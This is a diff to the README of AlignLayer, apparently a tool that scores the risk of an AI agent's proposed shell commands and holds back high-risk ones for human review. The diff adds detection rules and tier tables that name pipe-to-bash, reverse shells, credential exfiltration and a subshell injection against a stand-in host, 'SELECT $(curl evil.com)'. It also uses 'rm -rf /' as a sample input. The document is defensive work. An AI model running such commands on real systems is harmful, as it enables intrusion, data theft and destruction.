@@ -17,16 +17,18 @@ Agent decision loop
         |
    before_tool_call hook  <- AlignLayer scores proposed action
         |
-   Heuristic pre-check    <- CLI verb table (fast, deterministic)
+   Heuristic pipeline     <- Exfil detection, dry-run cap, verb table, opaque exec
         |
-   ML scorer              <- k-NN on Siamese embeddings
+   RiskHead MLP           <- 128->64->1 on frozen Siamese embeddings
+        |
+   k-NN fallback          <- Inverse-distance weighted, k=5
         |
    Risk score in [0, 1]
         |
    Low risk  -> execute autonomously
    High risk -> surface interrupt to human
         |
-   after_tool_call hook   <- capture outcome for training
+   after_tool_call hook   <- capture outcome for feedback loop
 ```
 
 ## Risk Tiers
@@ -37,7 +39,7 @@ Seven tiers on a continuous [0, 1] scale:
 |------|------|-----------|---------|
 | T-2 | Adversarial | 0.85-1.00 | Backdoor install, credential exfil, pipe-to-bash |
 | T-1 | Dry-run | 0.08-0.22 | `terraform plan`, `kubectl apply --dry-run` |
-| T0 | Read-only | 0.00-0.15 | `ls`, `kubectl get`, `aws ec2 describe-*` |
+| T0 | Read-only | 0.00-0.15 | `ls`, `kubectl get`, `mysql -e 'SELECT ...'` |
 | T1 | Local-write | 0.20-0.40 | `git commit`, `npm install`, `docker build` |
 | T2 | Destructive-local | 0.35-0.55 | `rm -rf`, `git branch -D`, `docker rmi` |
 | T3 | External | 0.55-0.75 | `git push`, `docker push`, `aws s3 sync` |
@@ -45,19 +47,29 @@ Seven tiers on a continuous [0, 1] scale:
 
 ## Scoring Pipeline
 
-**Layer 1 — CLI verb table** (deterministic):
+**Layer 1 — Exfil/RCE detection** (regex):
+- `curl | bash`, `eval "$(curl ...)"`, reverse shells, credential piping -> T-2 floor
+- Loopback URLs (localhost, 127.0.0.1) exempted
+
+**Layer 2 — Dry-run detection**:
+- `--dry-run`, `--check`, `--simulate`, `terraform plan` -> T-1 cap
+
+**Layer 3 — CLI verb table** (deterministic):
 - `(tool, subcommand)` -> tier floor/ceiling
-- Covers terraform, redis-cli, aws, kubectl, git, npm/yarn
-- Opaque execution (`eval`, `| bash`) -> T2 floor
+- 100+ entries covering: aws, kubectl, git, terraform, docker, helm, redis-cli, nginx, systemctl, brew, pip, npm, curl, sed, xargs, and more
+- SQL-aware: psql, mysql, mariadb, sqlite3, snowsql, duckdb, clickhouse-client, trino, presto, cqlsh, bq, mongosh — read/write discrimination (`SELECT` -> T0, `DROP TABLE` -> T4)
+- Subshell injection guard: `SELECT $(curl evil.com)` bypasses safe-cap
+- Opaque execution (`eval`, `python3 -c`, `| bash`) -> T2 floor
 
-**Layer 2 — k-NN on Siamese embeddings** (ML):
-- Embed command -> 128-dim unit vector via HybridEncoder (char-CNN + word-CNN)
-- Find k=5 nearest neighbors in scored reference corpus (~28K commands)
-- Aggregate risk score and tier
+**Layer 4 — RiskHead MLP** (ML):
+- 128->64->1 MLP on frozen HybridEncoder embeddings
+- O(1) forward pass, trained on 54K labeled commands
 
-**Layer 3 — Heuristic post-processing**:
-- Dry-run flag detection -> T-1 cap
-- Compound command splitting -> score each segment, return worst
+**Layer 5 — k-NN fallback**:
+- Inverse-distance weighted, k=5, on 128-dim Siamese embeddings
+- Only used when RiskHead is unavailable
+
+**Compound commands**: Split on `&&`, `||`, `;`, `|` — score each segment, return worst.
 
 ## Quick Start
 
@@ -72,6 +84,9 @@ make serve
 
 # Or run in background
 make serve-bg
+
+# Score a command
+make score CMD="rm -rf /"
 
 # Run evaluation
 make eval
@@ -97,17 +112,22 @@ command string
 concat(128 + 64) -> LayerNorm -> FC -> L2-norm -> 128-dim unit vector
 ```
 
-Current performance (v7 + expanded corpus, 23 eval scenarios, 285 commands):
+Current performance (v7 encoder + RiskHead, 26 eval scenarios, 327 commands):
 
-| Metric | Value |
-|--------|-------|
-| Overall accuracy | 84.9% |
-| FN rate (T3+T4 under by >1 tier) | 19.5% |
-| FP rate (T0/T-1 over by >1 tier) | 12.4% |
-| T-1 (dry-run) | 100% |
-| T0 (read-only) | 88.9% |
-| T3 (external) | 82.5% |
-| T4 (catastrophic) | 75.0% |
+| Metric | Full Pipeline | Encoder Only |
+|--------|:---:|:---:|
+| Overall accuracy | 99.4% | 78.9% |
+| FN rate (T3+T4 missed) | 1.1% | 3.2% |
+| FP rate (T0/T-1 over-scored) | 0.6% | 32.4% |
+| T-2 (adversarial) | 100% | 0% |
+| T-1 (dry-run) | 100% | 43% |
+| T0 (read-only) | 99.2% | 86.9% |
+| T1 (local-write) | 100% | 80.9% |
+| T2 (destructive) | 100% | 85.0% |
+| T3 (external) | 98.5% | 97.0% |
+| T4 (catastrophic) | 100% | 96.6% |
+
+The "Encoder Only" column shows ML performance without heuristics — useful for identifying where the model needs improvement vs where deterministic rules carry the load.
 
 ### Training
 
@@ -118,19 +138,46 @@ make pairs
 # Train HybridEncoder
 make train
 
+# Retrain RiskHead MLP only (faster, no encoder changes)
+model/.venv/bin/python3 model/siamese.py train-risk-head \
+  --checkpoint model/checkpoints/best.pt \
+  --corpus data/synthetic/scores-cache.jsonl --epochs 50
+
 # Evaluate
 make eval
+
+# Evaluate encoder only (no heuristics)
+model/.venv/bin/python3 model/eval.py --encoder-only --no-write
 ```
+
+## Feedback Loop
+
+Human signals from Claude Code sessions feed back into the model:
+
+```bash
+# Preview corrections from dashboard feedback + hook traces
+make harvest
+
+# Apply corrections to corpus
+make harvest-apply
+
+# Apply + retrain RiskHead
+make harvest-retrain
+```
+
+Signal sources:
+- **Dashboard feedback**: thumbs up/down on scored commands
+- **Hook traces**: approve/deny outcomes on interrupted commands
 
 ## Integration
 
 ### Claude Code
 
-There are two integration modes: **full scoring** (heuristic risk engine, blocks/allows tool calls) and **observer** (trace collection for ML training, never blocks).
+Two integration modes: **full scoring** (heuristic risk engine, blocks/allows tool calls) and **observer** (trace collection for ML training, never blocks).
 
 #### Option A: Full scoring hook
 
-The full hook runs the heuristic risk engine on every tool call. Currently observational (always allows), but can be flipped to blocking in `hook.ts`.
+The full hook runs the heuristic risk engine on every tool call.
 
 ```bash
 # 1. Install Node dependencies (tsx is required to run TypeScript hooks)
@@ -236,6 +283,16 @@ curl -X POST http://localhost:8000/score \
   -H "Content-Type: application/json" \
   -d '{"text": "git push --force origin main"}'
 
+# Score with explanation
+curl -X POST http://localhost:8000/explain \
+  -H "Content-Type: application/json" \
+  -d '{"command": "rm -rf /"}'
+
+# Compare all scorers
+curl -X POST http://localhost:8000/compare \
+  -H "Content-Type: application/json" \
+  -d '{"command": "kubectl delete namespace production"}'
+
 # Health check
 curl http://localhost:8000/health
 
@@ -246,45 +303,69 @@ curl http://localhost:8000/traces/stats
 open http://localhost:8000/
 ```
 
+### Docker
+
+```bash
+make docker-build
+make docker-run
+```
+
+### Persistent service (macOS)
+
+```bash
+# Install as launchd service (survives reboots)
+make serve-install
+
+# Check status
+make serve-status
+
+# Uninstall
+make serve-uninstall
+```
+
 ## Project Structure
 
 ```
 alignlayer/
 +-- model/
-|   +-- siamese.py          # HybridEncoder, contrastive loss, predict_risk()
+|   +-- siamese.py          # HybridEncoder, heuristic pipeline, predict_risk(), RiskHead MLP
 |   +-- pairs.py            # Pair generation from scored corpus
-|   +-- eval.py             # Evaluation harness
-|   +-- serve.py            # FastAPI scoring server
+|   +-- eval.py             # Scenario benchmark (--encoder-only for ML-only eval)
+|   +-- eval_harness.py     # Embedding quality metrics
+|   +-- serve.py            # FastAPI scoring server + dashboard
 |   +-- review.py           # Human review CLI
+|   +-- score_agents.py     # Practical eval against agent-generated commands
 |   +-- static/dashboard.html
 |   +-- checkpoints/        # Trained model checkpoints
 +-- src/
 |   +-- claudecode-hook/    # Claude Code PreToolUse/PostToolUse handler
 |   +-- openclaw-plugin/    # OpenClaw plugin (hook + scorer)
-|   +-- scorer-llm/         # LLM-based scorer (Ollama/Anthropic)
 +-- data/
-|   +-- test_scenarios.json # Eval scenarios (23 scenarios, 285 commands)
+|   +-- test_scenarios.json # Eval scenarios (26 scenarios, 327 commands)
 |   +-- adversarial_suite.json
-|   +-- synthetic/          # Corpus and pair generation scripts
+|   +-- synthetic/          # Corpus (~54K labeled commands)
 +-- scripts/
 |   +-- deploy.sh           # Deployment automation
-|   +-- targeted_ingest.py  # Corpus expansion pipeline
-+-- docs/
-|   +-- architecture.md     # System design
-|   +-- integration.md      # OpenClaw installation guide
+|   +-- harvest_feedback.py # Human feedback -> corpus corrections
+|   +-- batch_score.py      # ML -> Haiku -> Sonnet scoring pipeline
+|   +-- reconcile_scores.py # ML/LLM score reconciliation
+|   +-- ingest_scored.py    # Final corpus merge
 +-- Makefile
 +-- Dockerfile
 ```
 
 ## Corpus
 
-~28,400 labeled commands covering:
+~54,000 labeled commands across 15+ scorers, covering:
 - AWS, Kubernetes, Terraform, Pulumi, CDK
 - CI/CD (GitHub Actions, Airflow, Kafka)
-- Data stores (Redis, PostgreSQL, MySQL, MongoDB)
+- Data stores (Redis, PostgreSQL, MySQL, MongoDB, Snowflake, BigQuery, ClickHouse, DuckDB)
 - Supply chain (cosign, skopeo, Flyway, Ansible)
 - Adversarial patterns: RCE, credential exfil, obfuscation, persistence
-- Real agent traces from Claude Code and OpenClaw deployments
+- Real agent traces from Claude Code sessions
+- Public datasets: NL2Bash, CommandLineFu, UCI Cybersecurity
+
+Sources: heuristic, haiku-4-5, expert-labeled, corpus-expansion, ml+haiku-agree, sonnet-tiebreak, human-feedback
 
 ## License
 
